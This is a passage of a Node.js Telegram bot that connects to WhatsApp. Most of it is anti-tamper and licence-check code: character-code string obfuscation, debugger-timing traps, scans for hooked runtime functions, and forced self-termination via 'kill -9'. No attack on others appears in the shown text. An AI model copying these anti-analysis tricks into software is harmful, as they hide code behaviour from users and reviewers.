(function() {
  'use strict';

  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }

  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module');
    console.error('[!] Parent: ' + module.parent.filename);
    console.error('[!] Akses ditolak - Process dihentikan\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }

  const nativePattern = /\[native code\]/;
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i;

  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93]);
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;

  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {
    nativeExit = process.exit;
    nativeKill = process.kill;
    nativePid = process.pid;
  }

  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
      try { nativeExit(1); } catch(e) {}
      try { process.exit(1); } catch(e) {}
      while(1) {}
    };
  })();

  try {
    const M = require(buildStr([109,111,100,117,108,101]));
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override');
      forceKill();
    }

    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter');
      forceKill();
    }
  } catch(e) {}

  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const onFn = process.on;
    const onCode = onFn.toString();
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 ||
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch(e) {}

  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  });
  checkGlobals();

  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]));
    const execStr = cp.execSync.toString();
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString();
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected');
        forceKill();
      }
    }
  } catch(e) {}

  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr);
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter');
      forceKill();
    }
  } catch(e) {}

  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr);
        const reqFunc = https.request;

        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();

        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked');
          forceKill();
        }

        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns');
          forceKill();
        }

        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code');
          forceKill();
        }

      } catch(e) {}
    };
  })();

  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr);
        const reqFunc = http.request;

        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();

        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked');
          forceKill();
        }

        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns');
          forceKill();
        }

        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code');
          forceKill();
        }

      } catch(e) {}
    };
  })();

  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);

  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected');
        forceKill();
      }

      try {
        const M = require(buildStr([109,111,100,117,108,101]));
        const reqStr = M.prototype.require.toString();
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised');
          forceKill();
        }
      } catch(e) {}

      try {
        const exitFn = process[exitStr];
        const exitCode = exitFn.toString();
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised');
          forceKill();
        }
      } catch(e) {}

      try {
        const killFn = process[killStr];
        const killCode = killFn.toString();
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised');
          forceKill();
        }
      } catch(e) {}

      try {
        const axios = require('axios');
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active');
          forceKill();
        }
      } catch(e) {}

      checkHttps();
      checkHttp();
      checkGlobals();
    };
  })();

  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

})();

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./⎋Settings/config");
const FormData = require("form-data");
const yts = require("yt-search");
const fetch = require("node-fetch");
const AdmZip = require("adm-zip");
const https = require("https");

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    fetchLatestBaileysVersion,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.exit(1);
  }
  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.exit(1);
  }
  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.exit(1);
  }
  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.exit(1);
  }
  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.exit(1);
  }
  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.exit(1);
  }
  setInterval(() => {
    if (process.exit.toString().includes("console.log") ||
        process.abort.toString().includes("console.log")) {
      console.error(`[SECURITY] Process function dibajak saat runtime`);
      process.exit(1);
    }
  }, 500);

} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.exit(1);
}


const databaseUrl = 'https://raw.githubusercontent.com/rizkyyy02xi-sudo/xyrennpedo/main/tokens.json';
const thumbnailUrl = "https://files.catbox.moe/2dr1tu.jpg";
const thumbnailUrl2 = "https://files.catbox.moe/ileic7.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 50) {
      throw new Error(randErr());
    }
  }, 500);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.red(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
╭─❖──────────────────────────❖─╮
│ ❌  AKSES DI TOLAK   ❌
├───────────────────────────────
│⟢ Token Bot Tidak Terdaftar Di Database
╰─❖──────────────────────────❖─╯
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠈⠀⠀⠀⠀⠀
╭─❖──────────────────────────❖─╮
│ ❌  AKSES DI TOLAK   ❌
├───────────────────────────────
│⟢ Perubahan Kode Terdeteksi ⚠️
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
╭─❖──────────────────────────❖─╮
│ ❌  AKSES DI TOLAK   ❌
├───────────────────────────────
│⟢ Perubahan Kode Terdeteksi ⚠️
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
╭─❖──────────────────────────❖─╮
│ ❌  AKSES DI TOLAK   ❌
├───────────────────────────────
│⟢ Token Bot Tidak Terdaftar Di Database
╰─❖──────────────────────────❖─╯
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.red(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
╭─❖──────────────────────────❖─╮
│ ❌  AKSES DI TOLAK   ❌
├───────────────────────────────
│⟢ Gagal Menghubungi To Server
╰─❖──────────────────────────❖─╯
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function checkGroupOnly(ctx) {
  if (GROUP_ONLY && ctx.chat.type === "private") {
    ctx.reply("❌ Bot ini hanya dapat digunakan di group!")
      .then((sent) => {
        setTimeout(async () => {
          try {
            await ctx.telegram.deleteMessage(ctx.chat.id, sent.message_id);
          } catch (e) {}

          try {
            await ctx.telegram.deleteMessage(ctx.chat.id, ctx.message.message_id);
          } catch (e) {}
        }, 3000);
      });

    return false;
  }

  return true;
}

function uploadToCatbox(fileUrl) {
  const params = new URLSearchParams();
  params.append("reqtype", "urlupload");
  params.append("url", fileUrl);

  return axios.post("https://catbox.moe/user/api.php", params, {
    headers: { "content-type": "application/x-www-form-urlencoded" },
    timeout: 30000,
  }).then(({ data }) => data);
}

function createSafeSock(sock) {
  return new Proxy(sock, {
    get(target, prop) {
      if (["relayMessage", "sendMessage"].includes(prop)) return target[prop];
      return undefined;
    },
  });
}

function txt(m) {
  if (!m) return "";
  return (m.text || m.caption || "").trim();
}

function parseSecs(s) {
  if (typeof s === "number") return s;
  if (!s || typeof s !== "string") return 0;
